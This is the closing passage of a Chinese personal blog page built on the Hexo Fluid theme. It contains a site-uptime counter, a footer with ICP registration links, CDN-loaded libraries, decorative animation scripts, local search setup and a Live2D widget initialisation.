    hnum = Math.floor(hours);
    if (String(hnum).length == 1) {
        hnum = "0" + hnum;
    }
    minutes = (now - grt) / 1000 / 60 - (24 * 60 * dnum) - (60 * hnum);
    mnum = Math.floor(minutes);
    if (String(mnum).length == 1) {
        mnum = "0" + mnum;
    }
    seconds = (now - grt) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
    snum = Math.round(seconds);
    if (String(snum).length == 1) {
        snum = "0" + snum;
    }
    document.getElementById("timeDate").innerHTML = " 本站已安全运行 " + dnum + " 天 ";
    document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
}
setInterval("createtime()", 250);
</script>

<!-- 添加网站运行时间》-->
  </div>
  

  

    <div class="footer-center">
         <!--添加工信备案号-->
         <!--img src="https://static.dy208.cn/o_1dfilp8ruo521thr1hvf18ji17soa.png"-->
         <a href="http://beian.miit.gov.cn/"  style="color:#f72b07" target="_blank">豫ICP备2021010365号-1</a>
         <br/>
         <!--添加公安备案号-->
         <!--img src="https://static.dy208.cn/o_1dfilp8ruo521thr1hvf18ji17soa.png"-->
         <a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=41040202000160"  style="color:#f72b07" target="_blank">豫公网安备41040202000160号</a>
      </div>
  
</footer>

  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.2/dist/tocbot.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>



  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>






  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    (function () {
      var path = "/search.json";
      $('#local-search-input').on('click', function() {
        searchFunc(path, 'local-search-input', 'local-search-result');
      });
      $('#modalSearch').on('shown.bs.modal', function() {
        $('#local-search-input').focus();
      });
    })()
  </script>














  
<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/boom.js"></script>
<script src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script>
<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/qipao.js"></script>
<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/yinghua.js"></script>
<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/xiantiao.js"></script>
<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/caidai.js"></script>



<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>


<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
